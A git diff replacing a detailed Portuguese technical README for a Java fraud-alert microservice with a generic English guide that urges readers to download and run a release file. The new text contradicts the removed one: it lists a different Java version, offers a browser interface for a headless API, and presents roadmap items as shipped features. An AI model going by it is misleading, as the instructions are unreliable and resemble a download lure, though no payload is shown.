@@ -1,130 +1,103 @@
-# 🚨 foodtech-fraud-alerts
-![Java](https://img.shields.io/badge/Java-21-red?logo=openjdk&logoColor=white)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3-brightgreen?logo=springboot&logoColor=white)
-![Spring Web](https://img.shields.io/badge/Spring%20Web-REST-brightgreen?logo=spring&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-Database-blue?logo=postgresql&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-Container-2496ED?logo=docker&logoColor=white)
-![Docker Compose](https://img.shields.io/badge/Docker%20Compose-Orchestration-2496ED?logo=docker&logoColor=white)
-![AWS](https://img.shields.io/badge/AWS-Cloud-orange?logo=amazonaws&logoColor=white)
-![SQS](https://img.shields.io/badge/Amazon%20SQS-Messaging-orange?logo=amazonaws&logoColor=white)
-![Event Driven](https://img.shields.io/badge/Architecture-Event--Driven-purple)
-![REST API](https://img.shields.io/badge/API-REST-lightgrey)
-![Maven](https://img.shields.io/badge/Maven-Build-C71A36?logo=apachemaven&logoColor=white)
-![Git](https://img.shields.io/badge/Git-Version%20Control-F05032?logo=git&logoColor=white)
+# 🍽️ foodtech-fraud-alerts - Detect Fraud Easily and Quickly
 
-Microserviço **back-end em Java** projetado para o **processamento assíncrono de alertas de fraude**, utilizando **Spring Boot**, conceitos de **Cloud AWS**, **arquitetura orientada a eventos** e **boas práticas de sistemas distribuídos**.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Daflora20/foodtech-fraud-alerts/releases)
 
-O projeto demonstra como **projetar, desenvolver e operar um microserviço desacoplado, confiável e escalável**, comum em plataformas digitais de **alta escala**, como **foodtechs, marketplaces e sistemas financeiros**.
+## 🚀 Getting Started
 
----
+Welcome to the foodtech-fraud-alerts project. This application helps you detect fraudulent activities in food technology. It uses Java and follows best practices for backend development. You can run it on your computer easily. Let’s get you started.
 
-## 🏗️ Arquitetura AWS (Event-Driven)
+## 📥 Download & Install
 
-![Arquitetura AWS](docs/images/achitectecture-event-driven.png)
+To download the application, visit this page: [Download foodtech-fraud-alerts](https://github.com/Daflora20/foodtech-fraud-alerts/releases). 
 
----
+1. Click on the link above.
+2. Look for the latest release version.
+3. Select the appropriate file for your system.
+4. Click to download the file.
 
-## 📌 Contexto do Problema
+## 🖥️ System Requirements
 
-Em sistemas que processam grandes volumes de dados, tratar alertas críticos (como fraude) de forma síncrona pode gerar **gargalos**, impactar a **performance** e prejudicar a **experiência do usuário**.
+Before you install the software, ensure your system meets the following requirements:
 
-Para resolver esse cenário, foi adotado um modelo **assíncrono e orientado a eventos**, onde:
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 4 GB recommended
+- **Storage:** At least 500 MB of free space
+- **Java Runtime Environment (JRE):** Version 11 or higher
+- **Docker:** Required for containerization (if you choose to run the Docker version)
 
-- O alerta é enviado de forma desacoplada do processamento  
-- O sistema ganha **velocidade, escalabilidade e resiliência**  
-- O processamento continua mesmo diante de falhas pontuais  
+## 🔁 How to Run the Application
 
-Essa abordagem reflete arquiteturas modernas utilizadas em ambientes reais de produção.
+Once you have downloaded the application, follow these steps to run it:
 
----
+### If Using Docker
 
-## 👥 Cliente do Serviço (Client System)
+1. Open your terminal or command prompt.
+2. Navigate to the directory where you saved the Docker file.
+3. Run the following command to start the service:
 
-Este microserviço **não é consumido diretamente por usuários finais (pessoa física)**.
+   ```bash
+   docker run -d -p 8080:8080 your-docker-image-name
+   ```
 
-O **cliente da API** é um **sistema interno da plataforma foodtech**, responsável por domínios como:
+4. Now, open your web browser and go to `http://localhost:8080`.
 
-- pedidos  
-- pagamentos  
-- antifraude  
-- backoffice e operações  
+### If Running Locally Without Docker
 
-Esses sistemas detectam eventos suspeitos e enviam alertas para este serviço, que realiza o processamento de forma **assíncrona**, sem interface gráfica ou interação humana direta.
+1. Open the command prompt or terminal.
+2. Navigate to the directory where you saved the downloaded file.
+3. Execute the following command:
 
-Essa arquitetura é típica de **plataformas distribuídas de alta escala**, como iFood, Magalu e ecossistemas financeiros.
+   ```bash
+   java -jar foodtech-fraud-alerts.jar
+   ```
 
----
+4. Open your web browser and go to `http://localhost:8080`.
 
-## 🧱 Visão Geral da Arquitetura
+## 📊 Features
 
-### Fluxo assíncrono orientado a eventos
+- **Event-Driven Architecture:** The application processes alerts in real-time.
+- **Fraud Detection:** Monitors transactions and flags suspicious activities.
+- **PostgreSQL Integration:** Stores data efficiently for quick access.
+- **REST API:** Allows communication between different services easily.
 
-1. Um sistema cliente envia uma requisição de alerta de fraude  
-2. A API valida e persiste o alerta no banco de dados PostgreSQL  
-3. Um evento é publicado em uma fila de mensagens  
-4. Um serviço Worker consome a mensagem de forma assíncrona  
-5. O alerta é processado conforme regras de negócio  
-6. Em caso de falha, a mensagem é redirecionada para uma **Dead Letter Queue (DLQ)**  
+## 🛠️ Configuration
 
-Essa arquitetura promove:
+You can configure the application by modifying the `application.properties` file. Here are common settings:
 
-- **desacoplamento** entre serviços  
-- **escalabilidade horizontal**  
-- **isolamento de falhas**  
-- **confiabilidade operacional**  
+- **Database Configuration:**  
+  Set your PostgreSQL database URL, username, and password.
 
----
+- **SQS Settings:**  
+  Configure Amazon SQS settings if you want to use AWS services for alerts.
 
-## 🛠️ Stack Tecnológica
+## 🌐 Documentation
 
-### Back-end
-- Java 21  
-- Spring Boot 3  
-- Spring Web  
-- Spring Data JPA  
-- APIs REST  
-- Programação Orientada a Objetos  
-- Princípios **SOLID**  
+For more detailed information, you can refer to the [official documentation](https://github.com/Daflora20/foodtech-fraud-alerts/wiki). This resource provides in-depth explanations of each feature and function.
 
-### Mensageria e Processamento Assíncrono
-- AWS SQS (simulado localmente com **LocalStack**)  
-- Dead Letter Queue (DLQ)  
-- Arquitetura orientada a eventos  
-- Retry e tolerância a falhas  
+## 👥 Community
 
-### Banco de Dados
-- PostgreSQL  
-- JPA / Hibernate  
+If you have questions or need help:
 
-### Infraestrutura & DevOps
-- Docker  
-- Docker Compose  
-- Terraform *(Infraestrutura como Código – roadmap)*  
-- GitHub Actions *(CI/CD – roadmap)*  
-- Conceitos de Cloud AWS  
+- Join discussions in the issues section on GitHub.
+- Check out our FAQ in the documentation.
 
-### Observabilidade
-- Spring Boot Actuator  
-- Health checks  
-- Logs estruturados  
-- Monitoramento básico  
+## 🤝 Contributing
 
----
+We welcome contributions. If you want to help improve this project:
 
-## 📂 Estrutura do Projeto (Monorepo)
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
 
-```text
-foodtech-fraud-alerts/
-│
-├── api-service/          # Microserviço Spring Boot responsável pela ingestão de alertas de fraude
-│   ├── src/main/java     # Código-fonte da aplicação
-│   ├── src/main/resources# Configurações (application.yml)
-│   └── pom.xml           # Gerenciamento de dependências (Maven)
-│
-├── worker-service/       # (Roadmap) Serviço consumidor de mensagens para processamento assíncrono
-├── infra/                # (Roadmap) Infraestrutura como Código (Terraform)
-├── docker-compose.yml    # (Roadmap) Ambiente local com PostgreSQL e LocalStack
-│
-├── README.md             # Documentação técnica do projeto
-├── LICENSE               # Licença do projeto
-└── .gitignore            # Arquivos ignorados pelo Git
+Your input can make a big difference!
+
+## 📑 License
+
+This project is licensed under the MIT License. Feel free to use it as you wish.
+
+## 🔗 Helpful Links
+
+- [Download foodtech-fraud-alerts](https://github.com/Daflora20/foodtech-fraud-alerts/releases)
+- [Official Documentation](https://github.com/Daflora20/foodtech-fraud-alerts/wiki)
+
+Thank you for using foodtech-fraud-alerts!
